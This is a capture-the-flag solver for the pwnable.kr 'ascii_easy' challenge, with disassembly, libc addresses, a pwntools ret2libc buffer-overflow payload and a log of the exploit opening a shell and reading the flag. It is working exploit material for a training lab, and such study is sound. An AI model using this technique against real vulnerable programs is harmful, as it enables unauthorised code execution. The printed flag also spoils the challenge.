'''
Description:

    Ascii armoring is one of a security protection for exploit mitigation.
    Can you find a security hole and bypass it?

    hint : ulimit

    ssh ascii_easy@pwnable.kr -p2222 (pw:guest)

Solution:
    
    ulimit -s unlimited
    
    Dump of assembler code for function main:
    0x08048512 <+0>:    push   ebp
    0x08048513 <+1>:    mov    ebp,esp
    0x08048515 <+3>:    push   ebx
    0x08048516 <+4>:    and    esp,0xfffffff0
    0x08048519 <+7>:    sub    esp,0x30
    0x0804851c <+10>:   mov    DWORD PTR [esp+0x14],0x0
    0x08048524 <+18>:   mov    DWORD PTR [esp+0x10],0xffffffff
    0x0804852c <+26>:   mov    DWORD PTR [esp+0xc],0x32
    0x08048534 <+34>:   mov    DWORD PTR [esp+0x8],0x7
    0x0804853c <+42>:   mov    DWORD PTR [esp+0x4],0x1000
    0x08048544 <+50>:   mov    DWORD PTR [esp],0x80000000
    0x0804854b <+57>:   call   0x8048400 <mmap@plt>
    0x08048550 <+62>:   mov    DWORD PTR [esp+0x2c],eax
    0x08048554 <+66>:   cmp    DWORD PTR [esp+0x2c],0x80000000
    0x0804855c <+74>:   je     0x8048576 <main+100>
    0x0804855e <+76>:   mov    DWORD PTR [esp],0x80486b0
    0x08048565 <+83>:   call   0x80483e0 <puts@plt>
    0x0804856a <+88>:   mov    DWORD PTR [esp],0x1
    0x08048571 <+95>:   call   0x80483b0 <_exit@plt>
    0x08048576 <+100>:  mov    eax,0x80486c8
    0x0804857b <+105>:  mov    DWORD PTR [esp],eax
    0x0804857e <+108>:  call   0x80483a0 <printf@plt>
    0x08048583 <+113>:  mov    DWORD PTR [esp+0x28],0x0
    0x0804858b <+121>:  cmp    DWORD PTR [esp+0x28],0x18f
    0x08048593 <+129>:  ja     0x80485be <main+172>
    0x08048595 <+131>:  mov    eax,DWORD PTR [esp+0x28]
    0x08048599 <+135>:  mov    edx,DWORD PTR [esp+0x2c]
    0x0804859d <+139>:  lea    ebx,[edx+eax*1]
    0x080485a0 <+142>:  call   0x80483c0 <getchar@plt>
    0x080485a5 <+147>:  mov    BYTE PTR [ebx],al
    0x080485a7 <+149>:  movzx  eax,BYTE PTR [ebx]
    0x080485aa <+152>:  movsx  eax,al
    0x080485ad <+155>:  add    DWORD PTR [esp+0x28],0x1
    0x080485b2 <+160>:  mov    DWORD PTR [esp],eax
    0x080485b5 <+163>:  call   0x80484d4 <is_ascii>
    0x080485ba <+168>:  test   eax,eax
    0x080485bc <+170>:  jne    0x804858b <main+121>
    0x080485be <+172>:  mov    DWORD PTR [esp],0x80486d6
    0x080485c5 <+179>:  call   0x80483e0 <puts@plt>
    0x080485ca <+184>:  call   0x80484f1 <vuln>
    0x080485cf <+189>:  mov    ebx,DWORD PTR [ebp-0x4]
    0x080485d2 <+192>:  leave  
    0x080485d3 <+193>:  ret    
    End of assembler dump.

    Dump of assembler code for function is_ascii:
    0x080484d4 <+0>:    push   ebp
    0x080484d5 <+1>:    mov    ebp,esp
    0x080484d7 <+3>:    cmp    DWORD PTR [ebp+0x8],0x1f
    0x080484db <+7>:    jle    0x80484ea <is_ascii+22>
    0x080484dd <+9>:    cmp    DWORD PTR [ebp+0x8],0x7f
    0x080484e1 <+13>:   jg     0x80484ea <is_ascii+22>
    0x080484e3 <+15>:   mov    eax,0x1
    0x080484e8 <+20>:   jmp    0x80484ef <is_ascii+27>
    0x080484ea <+22>:   mov    eax,0x0
    0x080484ef <+27>:   pop    ebp
    0x080484f0 <+28>:   ret    
    End of assembler dump.

    Dump of assembler code for function vuln:
    0x080484f1 <+0>:    push   ebp
    0x080484f2 <+1>:    mov    ebp,esp
    0x080484f4 <+3>:    sub    esp,0xb8
    0x080484fa <+9>:    mov    DWORD PTR [esp+0x4],0x80000000
    0x08048502 <+17>:   lea    eax,[ebp-0xa8]
    0x08048508 <+23>:   mov    DWORD PTR [esp],eax
    0x0804850b <+26>:   call   0x80483d0 <strcpy@plt>
    0x08048510 <+31>:   leave  
    0x08048511 <+32>:   ret    
    End of assembler dump.

    (gdb) p system
    $1 = {<text variable, no debug info>} 0x555c5250 <system>

    (gdb) info sharedlibrary 
    From        To          Syms Read   Shared Object Library
    0x55555820  0x5556e05f  Yes (*)     /lib/ld-linux.so.2
    0x5559cf10  0x556d151c  Yes (*)     /lib32/libc.so.6
    (*): Shared library is missing debugging information.

    (gdb) find 0x5559cf10, +4000000, "/bin/sh"
    0x556e4a2c
    warning: Unable to access target memory at 0x5572af34, halting search.
    1 pattern found.


Solver:
'''

from pwn import *

user   = 'ascii_easy'
passwd = 'guest'
host   = 'pwnable.kr'
port   = 2222

overflow    = 'H' * 0xAC
addr_system = '\x50\x52\x5c\x55'
addr_sh     = '\x2c\x4a\x6e\x55'
trash       = 'TRAS'
payload     = overflow + addr_system + trash + addr_sh
print 'Payload: ', payload

s = ssh(user, host, port, passwd)
s.interactive()
s.close()

'''
Log:

Payload:  HHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHPR\UTRAS,JnU
[+] Connecting to pwnable.kr on port 2222: Done
[+] Opening new channel: None: Done
[*] Switching to interactive mode
  ____  __    __  ____    ____  ____   _        ___      __  _  ____  
 |    \|  |__|  ||    \  /    ||    \ | |      /  _]    |  |/ ]|    \ 
 |  o  )  |  |  ||  _  ||  o  ||  o  )| |     /  [_     |  ' / |  D  )
 |   _/|  |  |  ||  |  ||     ||     || |___ |    _]    |    \ |    / 
 |  |  |  `  '  ||  |  ||  _  ||  O  ||     ||   [_  __ |     \|    \ 
 |  |   \      / |  |  ||  |  ||     ||     ||     ||  ||  .  ||  .  \
 |__|    \_/\_/  |__|__||__|__||_____||_____||_____||__||__|\_||__|\_|


- Site admin : daehee87.kr@gmail.com
- IRC : irc.smashthestack.org:6667 / #pwnable.kr
- Simply type "irssi" command to join IRC now
- files under /tmp can be erased anytime. make your directory under /tmp
- to use peda, issue `source /usr/share/peda/peda.py` in gdb terminal

ascii_easy@ubuntu:~$ ulimit -s unlimited
ascii_easy@ubuntu:~$ ./ascii_easy
Input text : HHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHPR\UTRAS,JnU
triggering bug...
$ cat flag
damn you ascii armor... what a pain in the ass!! :(
$ exit
Segmentation fault
ascii_easy@ubuntu:~$ exit
logout
[*] Got EOF while reading in interactive
[*] Closed SSH channel with pwnable.kr
[*] Closed connection to 'pwnable.kr'
'''
